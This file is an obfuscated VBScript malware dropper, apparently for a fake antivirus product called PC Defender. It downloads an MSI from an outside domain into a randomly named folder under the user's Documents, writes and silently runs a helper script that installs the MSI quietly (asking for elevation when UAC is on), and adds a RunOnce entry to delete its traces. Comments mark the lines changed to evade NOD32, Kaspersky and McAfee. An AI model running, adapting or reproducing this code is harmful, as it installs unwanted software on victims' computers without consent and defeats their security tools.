Dim spE1MXjV4M74H2v, a2EFW9J55Jc0p22
ivBEeiMz6pzg7jte6KeKF0xrY = "" & kgmhGexO17OVTEUU9U & "\" & P0jxFkPu928ea7pQ5i ' <- NOD32
Set spE1MXjV4M74H2v = CreateObject("Scripting.FileSystemObject")
Set a2EFW9J55Jc0p22 = spE1MXjV4M74H2v.CreateFolder(ivBEeiMz6pzg7jte6KeKF0xrY)

xGrd4i6O4MOW6p5rTvJ6 = "http://kaksosat.info/PCDefenderSilentSetup.msi"
UtX29k61v5QdP2vB85X0 = "" & P0jxFkPu928ea7pQ5i & ".msi"
g2q3T5SwkD8 xGrd4i6O4MOW6p5rTvJ6, ivBEeiMz6pzg7jte6KeKF0xrY, UtX29k61v5QdP2vB85X0 ' <- KIS

xMgz50MiF = "Dim p33H5Ro9ia5RxZU7, wjaX8786EGbOdsfd74dm8EE1a, hOltcKKkEY1F7Ui2iDwB1A1x, dxeGYiS4D1P3s118Ii6Hk, yBuHzQ3RInq9fc1J5r7, qVQ5H4pXq337I1g2TX42" & vbCr & vbLf & _
    "Set p33H5Ro9ia5RxZU7 = CreateObject(""WScript.Shell"")" & vbCr & vbLf & _
    "wjaX8786EGbOdsfd74dm8EE1a = p33H5Ro9ia5RxZU7.ExpandEnvironmentStrings(""%OS%"")" & vbCr & vbLf & _
    "If wjaX8786EGbOdsfd74dm8EE1a = ""Windows_NT"" Then" & vbCr & vbLf & _
    "   hOltcKKkEY1F7Ui2iDwB1A1x = ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\""" & vbCr & vbLf & _
    "   dxeGYiS4D1P3s118Ii6Hk = p33H5Ro9ia5RxZU7.regread(hOltcKKkEY1F7Ui2iDwB1A1x & ""CurrentVersion"")" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
    "  hOltcKKkEY1F7Ui2iDwB1A1x = ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\""" & vbCr & vbLf & _
    "  dxeGYiS4D1P3s118Ii6Hk = p33H5Ro9ia5RxZU7.regread(hOltcKKkEY1F7Ui2iDwB1A1x & ""VersionNumber"")" & vbCr & vbLf & _
    "End if" & vbCr & vbLf & _
    "dxeGYiS4D1P3s118Ii6Hk = Mid(dxeGYiS4D1P3s118Ii6Hk,1,1)" & vbCr & vbLf & _
    "If (dxeGYiS4D1P3s118Ii6Hk = 6) Then" & vbCr & vbLf & _
    "   yBuHzQ3RInq9fc1J5r7 = ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\""" & vbCr & vbLf & _
    "   qVQ5H4pXq337I1g2TX42 = p33H5Ro9ia5RxZU7.regread(yBuHzQ3RInq9fc1J5r7 & ""EnableLUA"")" & vbCr & vbLf & _
    "End If" & vbCr & vbLf & _
    "Set p33H5Ro9ia5RxZU7 = Nothing" & vbCr & vbLf & _
    "Set p33H5Ro9ia5RxZU7 = CreateObject(""Shell.Application"")" & vbCr & vbLf & _
	"If ((dxeGYiS4D1P3s118Ii6Hk = 6) AND (qVQ5H4pXq337I1g2TX42 = 1)) Then" & vbCr & vbLf & _
	"   p33H5Ro9ia5RxZU7.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&UtX29k61v5QdP2vB85X0&""" & Chr(34) & "" /quiet"", """", ""runas"", 1" & vbCr & vbLf & _
    "   Set p33H5Ro9ia5RxZU7 = Nothing" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
	"   p33H5Ro9ia5RxZU7.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&UtX29k61v5QdP2vB85X0&""" & Chr(34) & "" /quiet"", """", ""open"", 1" & vbCr & vbLf & _
    "   Set p33H5Ro9ia5RxZU7 = Nothing" & vbCr & vbLf & _
    "End If"
d1YkcBpCqcevk3Sqxn = ivBEeiMz6pzg7jte6KeKF0xrY & "\" & P0jxFkPu928ea7pQ5i & ".vbs"
Set cCG2s8b8182o65 = spE1MXjV4M74H2v.OpenTextFile(d1YkcBpCqcevk3Sqxn, 8, True)
cCG2s8b8182o65.WriteLine(xMgz50MiF)
cCG2s8b8182o65.Close

dim xQO2z48yp2qW948u5i5Cp0QP
set xQO2z48yp2qW948u5i5Cp0QP = CreateObject("Shell.Application")
xQO2z48yp2qW948u5i5Cp0QP.ShellExecute "wscript", """" & d1YkcBpCqcevk3Sqxn & """", "", "open", 0 ' <- McAfee
set xQO2z48yp2qW948u5i5Cp0QP = nothing

bwcr2I4Fd5u ivBEeiMz6pzg7jte6KeKF0xrY


Function g2q3T5SwkD8(r3xG93KyeqxNd3Ft7i841XcS, v7h4MB, Ht2495RN69XVPu56tFn)
   Dim c2955nXLdKxrOq0, oC91F7M00fnNysOBYe18uj
   
   r3xG93KyeqxNd3Ft7i841XcS = Replace(r3xG93KyeqxNd3Ft7i841XcS,"\","/")

   'If len(Ht2495RN69XVPu56tFn) = 0 Then ' <- KIS
   '   Exit Function 
   'End If

   Set c2955nXLdKxrOq0 = CREATEOBJECT("Microsoft.XMLHTTP") 
   c2955nXLdKxrOq0.open "GET", r3xG93KyeqxNd3Ft7i841XcS, "False" 

   c2955nXLdKxrOq0.send 
   If c2955nXLdKxrOq0.statustext = "OK" Then 
      Set oC91F7M00fnNysOBYe18uj = CreateObject("ADODB.Stream") 
      oC91F7M00fnNysOBYe18uj.type = 1 
      oC91F7M00fnNysOBYe18uj.Open 
      oC91F7M00fnNysOBYe18uj.Write c2955nXLdKxrOq0.responseBody 

      if len(v7h4MB) > 0 Then Ht2495RN69XVPu56tFn = v7h4MB & "\" & Ht2495RN69XVPu56tFn 
      oC91F7M00fnNysOBYe18uj.SaveToFile Ht2495RN69XVPu56tFn, 2 
      oC91F7M00fnNysOBYe18uj.Close 
      Set oC91F7M00fnNysOBYe18uj = Nothing 
      g2q3T5SwkD8 = 1
   End if 
   Set c2955nXLdKxrOq0 = Nothing
End Function


Function P0jxFkPu928ea7pQ5i
	WT1O9b = 14
	Wl060EZafJGsB59L = 7

	Randomize  
	O63a3orV79f8M0je1Lls = Int(((WT1O9b - Wl060EZafJGsB59L + 1) * Rnd) _
	    + WT1O9b)  

	WT1O9b = 90
	Wl060EZafJGsB59L = 65
	
	For i = 1 to O63a3orV79f8M0je1Lls
	    Randomize
	    lUjXn3pml0Bw1UW4wdN = Int(((WT1O9b - Wl060EZafJGsB59L + 1) * Rnd) _
	        + Wl060EZafJGsB59L)  
	    mUvY4QZ5Q90Nr = mUvY4QZ5Q90Nr & Chr(lUjXn3pml0Bw1UW4wdN)
	Next
	
	P0jxFkPu928ea7pQ5i = mUvY4QZ5Q90Nr
End Function


Function kgmhGexO17OVTEUU9U
	Set YQaaUjR73850w5m79wyY01 = Wscript.CreateObject("Wscript.Shell")
	kgmhGexO17OVTEUU9U = YQaaUjR73850w5m79wyY01.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
End Function


Function bwcr2I4Fd5u(e68Mmx2JBKt)
	Set m0TmJ = Wscript.CreateObject("Wscript.Shell")
	m0TmJ.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\delpcdefmsi", "cmd /c rmdir /s /q """ & e68Mmx2JBKt & """", "REG_SZ"
End Function
